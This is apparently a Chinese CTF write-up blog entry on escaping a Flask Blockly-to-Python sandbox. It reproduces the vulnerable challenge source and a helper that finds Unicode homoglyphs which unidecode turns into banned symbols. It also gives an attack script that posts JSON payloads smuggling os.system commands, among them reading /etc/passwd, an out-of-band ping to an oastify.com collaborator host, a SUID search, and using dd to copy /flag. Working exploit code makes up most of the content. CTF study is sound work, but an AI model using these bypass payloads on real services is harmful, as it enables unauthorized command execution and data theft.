class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 &#x27;+len=lambda x:0;os.system(&#x27;cat /flag&#x27;) +&#x27;</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line"><span class="comment"># 居然不能执行，本地看一下，是有些字符消失了</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇cat ／etc／passwd＇⁾⁾﹔＇</span><br><span class="line"><span class="comment"># 带外尝试，无反应，可能不出网</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇ping ﹣c <span class="number">4</span> x425n3uqpcd5ljq0c4809gjsijoac10q․oastify․com＇⁾⁾﹔＇</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终构造还是没有成功，但是每一个字符都有试成功哩</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔os․system⁽＇ls －la ／proc＇⁾﹔＇</span><br><span class="line">    <span class="comment"># len没有绕过成功？不是哥们，回显也是true哩</span></span><br><span class="line">    ＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽<span class="built_in">len</span>⁽＇a＇⁾⁼⁼<span class="number">0</span>⁾﹔＇</span><br></pre></td></tr></table></figure></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><h3 id="关于字符串"><a href="#关于字符串" class="headerlink" title="*关于字符串"></a>*关于字符串</h3><ol><li><em><strong>加深了我对字符串编码的理解</strong></em><ol><li>你在本地<strong>通过python</strong>发出去的\n和\r还有\u编码这些都会直接解释为对应的字符，在发出去的字符串中根本不会有\这个字符，不需要进行绕过</li><li>但是如果<strong>是在bp</strong>中的话，那么对方接受到的就是有带\的</li><li><strong>最大大的区别在于</strong>: 是否在发出去时有进行替换，记住的是python有</li></ol></li></ol><h3 id="绕过点1-unidecode-unidecode"><a href="#绕过点1-unidecode-unidecode" class="headerlink" title="绕过点1: unidecode.unidecode"></a>绕过点1: unidecode.unidecode</h3><blockquote><p>脚本技巧，见同名unidecode</p></blockquote><h3 id="绕过点2-ast-Import和ast-ImportFrom"><a href="#绕过点2-ast-Import和ast-ImportFrom" class="headerlink" title="绕过点2: ast.Import和ast.ImportFrom"></a>绕过点2: ast.Import和ast.ImportFrom</h3><blockquote><p>多多ai并查就好了</p></blockquote><ol><li>Import 语句：<ol><li>Import 节点表示一个 import 语句，用于导入整个模块或多个模块。</li><li>例如：import os 或 import sys, os。</li></ol></li><li>ImportFrom 语句：<ol><li>ImportFrom 节点表示一个 from … import 语句，用于从模块中导入特定的名称。</li><li>例如：from os import path 或 from sys import version as ver’</li></ol></li></ol><h3 id="绕过点3-suid提权"><a href="#绕过点3-suid提权" class="headerlink" title="绕过点3: suid提权"></a>绕过点3: suid提权</h3><blockquote><p>详见文章Linux提权，这里不做原理介绍</p></blockquote><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ol><li><p>helper.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;代码逻辑</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. 转换和打印字符串：</span></span><br><span class="line"><span class="string">    unidecode.unidecode(&quot;Κνωσός&quot;) 将希腊语字符串 &quot;Κνωσός&quot; 转换为 ASCII 字符串 &quot;Knosos&quot; 并打印。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2. 查找目标字符：</span></span><br><span class="line"><span class="string">    遍历 unidecode 库中的数据文件，每个文件名格式为 unidecode.xXXX，其中 XXX 是从 000 到 1F0 的十六进制值。</span></span><br><span class="line"><span class="string">    对于每个文件，检查目标字符 ( 是否存在于文件的数据中。</span></span><br><span class="line"><span class="string">    如果找到目标字符，打印相关的信息并计算其 Unicode 编码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(unidecode.unidecode(<span class="string">&quot;Κνωσός&quot;</span>))</span><br><span class="line">target = <span class="string">&quot;(&quot;</span></span><br><span class="line"><span class="keyword">for</span> section <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x000</span>, <span class="number">0x1f1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mod = <span class="built_in">__import__</span>(<span class="string">&#x27;unidecode.x%03x&#x27;</span>%(section), <span class="built_in">globals</span>(), <span class="built_in">locals</span>(),</span><br><span class="line">        [<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> mod.data:</span><br><span class="line">            <span class="built_in">print</span>(mod.data)</span><br><span class="line">            <span class="built_in">print</span>(section)</span><br><span class="line">            <span class="built_in">print</span>(mod.data.index(target))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>((section &lt;&lt; <span class="number">8</span>) + mod.data.index(target)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br></pre></td></tr></table></figure></li><li><p>攻击脚本</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;v1nd大哥的脚本</span></span><br><span class="line"><span class="string">import requests</span></span><br><span class="line"><span class="string">import unidecode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">host=&quot;http://eci-2zeirp9f80b0rxfe0hmg.cloudeci1.ichunqiu.com:5000&quot;</span></span><br><span class="line"><span class="string">payload=&#123;</span></span><br><span class="line"><span class="string">    &quot;blocks&quot;:&#123;</span></span><br><span class="line"><span class="string">        &quot;languageVersion&quot;:0,</span></span><br><span class="line"><span class="string">        &quot;blocks&quot;:[</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;type&quot;:&quot;text&quot;,</span></span><br><span class="line"><span class="string">                &quot;id&quot;:&quot;e]W.L~w)W,CStEc*Polc&quot;,</span></span><br><span class="line"><span class="string">                &quot;x&quot;:179,</span></span><br><span class="line"><span class="string">                &quot;y&quot;:80,</span></span><br><span class="line"><span class="string">                &quot;fields&quot;:&#123;</span></span><br><span class="line"><span class="string">                    &quot;TEXT&quot;:&quot;1’\nlen\u207clambda x\u10381\nprint（\u2017\u2017import\u2017\u2017（‘os’）\u1362system（‘cat ／tmp／flag’））\n\u2580&quot;</span></span><br><span class="line"><span class="string">                    # 1&#x27;</span></span><br><span class="line"><span class="string">                    # len=lambda x:1</span></span><br><span class="line"><span class="string">                    # print(__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/flag&#x27;))</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        ]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">r = requests.post(host+&quot;/blockly_json&quot;, json=payload, timeout=5)</span></span><br><span class="line"><span class="string">print(r.text)</span></span><br><span class="line"><span class="string">print(unidecode.unidecode(u&#x27;1’\nlen\u207clambda x\u10381\nprint（\u2017\u2017import\u2017\u2017（‘os’）\u1362system（‘cat ／tmp／flag’））\n\u2580&#x27;))</span></span><br><span class="line"><span class="string"># print(unidecode.unidecode(&#x27;\u2017&#x27;))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">测试过程</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ls ﹣l ／flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ls ﹣la ／proc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat ／proc／1／cmdline # 输出: /bin/sh-cpython app.py0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">find ／ ﹣user root ﹣perm ﹣4000 # 输出如下</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /bin/umount</span></span><br><span class="line"><span class="string">    /bin/dd</span></span><br><span class="line"><span class="string">    /bin/su</span></span><br><span class="line"><span class="string">    /bin/mount</span></span><br><span class="line"><span class="string">    /bin/ls</span></span><br><span class="line"><span class="string">    /usr/bin/chfn</span></span><br><span class="line"><span class="string">    /usr/bin/chsh</span></span><br><span class="line"><span class="string">    /usr/bin/newgrp</span></span><br><span class="line"><span class="string">    /usr/bin/passwd</span></span><br><span class="line"><span class="string">    /usr/bin/gpasswd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dd if⁼／flag of⁼／tmp／flag</span></span><br><span class="line"><span class="string">cat ／tmp／flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;7c1a4fe8981e295a78508a49146340b9&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://eci-2ze6bhm7y89tv5q2wd5n.cloudeci1.ichunqiu.com:5000&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;blocks&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;languageVersion&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;blocks&quot;</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>:<span class="string">&quot;text&quot;</span>,</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:<span class="string">&quot;e]W.L~w)W,CStEc*Polc&quot;</span>,</span><br><span class="line">                <span class="string">&quot;x&quot;</span>:<span class="number">179</span>,</span><br><span class="line">                <span class="string">&quot;y&quot;</span>:<span class="number">80</span>,</span><br><span class="line">                <span class="string">&quot;fields&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;TEXT&quot;</span>:<span class="string">&quot;＇﹔len⁼lambda x：0﹔os․system⁽＇ls ̄﹣la ／proc＇⁾﹔＇&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(host+<span class="string">&quot;/blockly_json&quot;</span>,json=payload,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Playground_强网24</title>
      <link href="/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>Flask沙盒逃逸？</li><li>&#x2F;entrypoint.sh<ol><li>环境变量读flag，不行，这里是docker不同 checked</li><li>root读flag，权限问题 -&gt; 沙盒的运行环境是一个在本地2077端口的服务</li></ol></li><li>权限问题看看dockerfile<ol><li>&#x2F;tmp&#x2F;go 777</li><li>&#x2F;app 700 仅所有者可读、写、执行</li><li>&#x2F;sandbox 755 所有者可读、写、执行，其他用户可读、执行</li><li>&#x2F;flag 400 仅所有者可读，这是什么情况 -&gt; 问题不大后面再来，ps aux再来看看绕过即可，这个就涉及到提权问题了</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
